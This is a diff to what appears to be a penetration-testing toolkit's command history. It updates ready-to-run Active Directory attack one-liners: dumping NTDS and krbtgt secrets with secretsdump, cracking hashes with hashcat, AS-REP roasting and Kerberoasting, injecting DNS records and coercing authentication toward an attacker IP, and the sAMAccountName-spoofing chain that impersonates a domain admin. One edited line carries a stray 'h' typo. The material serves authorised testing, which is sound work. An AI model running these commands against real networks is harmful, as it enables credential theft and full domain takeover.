@@ -138,8 +138,8 @@ export KRB5CCNAME=randomuser.ccache
 secretsdump -k "$TARGET"
 hashcat --status --hash-type 1000 --attack-mode 0 --username "$DOMAIN".ntds `fzf-wordlists`
 hashcat --hash-type 1000 --potfile-path "$DOMAIN".ntds.cracked "$DOMAIN".ntds --show --username
-cme ldap "$TARGET" -d "$DOMAIN" -u "$USER" -p "$PASSWORD" --asreproast ASREProastables.txt --kdcHost "$DC_HOST"
-cme ldap "$TARGET" -d "$DOMAIN" -u "$USER" -p "$PASSWORD" --kerberoasting Kerberoastables.txt --kdcHost "$DC_HOST"
+cme ldap "$DC_HOST" -d "$DOMAIN" -u "$USER" -p "$PASSWORD" --asreproast ASREProastables.txt --kdcHost "$DC_HOST"
+cme ldap "$DC_HOST"h -d "$DOMAIN" -u "$USER" -p "$PASSWORD" --kerberoasting Kerberoastables.txt --kdcHost "$DC_HOST"
 ldapsearch -x -l "$DC_HOST" -D '' -w '' -b 'dc=DOMAIN,dc=LOCAL'
 addspn.py -u "$DOMAIN"\\'SV01$' -p "ffffffffffffffffffffffffffffffff":"$NT_HASH" -s "HOST/EXEGOL-01.$DOMAIN" --additional "$DC_HOST"
 dnstool.py -u "$DOMAIN"\\'SV01$' -p "ffffffffffffffffffffffffffffffff":"$NT_HASH" -r "EXEGOL-01.$DOMAIN" -d "$ATTACKER_IP" --action add "$DC_HOST"
@@ -313,11 +313,11 @@ nuclei -u https://example.com
 httpx -probe -list hosts.txt -tech-detect -status-code -fr
 prips 192.168.56.0/24|hakrevdns -d|httpx -probe -tech-detect -status-code -fr
 ntpdate -u "$TARGET"
-renameMachine.py -current-name 'testcomputer$' -new-name 'DC01' -dc-ip dc01 "$DOMAIN"/"$USER":"$PASSWORD"
-getTGT.py -dc-ip dc01 "$DOMAIN"/'DC01':'123pentest'
-renameMachine.py -current-name 'DC01' -new-name 'testcomputer$' -dc-ip dc01 "$DOMAIN"/"$USER":"$PASSWORD"
-KRB5CCNAME='DC01.ccache' getST.py -self -impersonate 'domainadmin' -k -no-pass -dc-ip dc01 "$DOMAIN"/"$DC_HOST"
-KRB5CCNAME='domainadmin.ccache' secretsdump -just-dc-user 'krbtgt' -dc-ip dc01 -k -no-pass @"$DC_HOST"
+renameMachine.py -current-name 'testcomputer$' -new-name 'DC01' -dc-ip "$DC_HOST" "$DOMAIN"/"$USER":"$PASSWORD"
+getTGT.py -dc-ip "$DC_HOST" "$DOMAIN"/'DC01':'123pentest'
+renameMachine.py -current-name 'DC01' -new-name 'testcomputer$' -dc-ip "$DC_HOST" "$DOMAIN"/"$USER":"$PASSWORD"
+KRB5CCNAME='DC01.ccache' getST.py -self -impersonate 'domainadmin' -k -no-pass -dc-ip "$DC_HOST" "$DOMAIN"/"$DC_HOST"
+KRB5CCNAME='domainadmin.ccache' secretsdump -just-dc-user 'krbtgt' -dc-ip "$DC_HOST" -k -no-pass @"$DC_HOST"
 pwndb --target @example.com --output txt
 robotstester -u http://www.example.com/ -L
 shadowcoerce.py -d "$DOMAIN" -u "$USER" -p "$PASSWORD" "$ATTACKER_IP" "$TARGET"
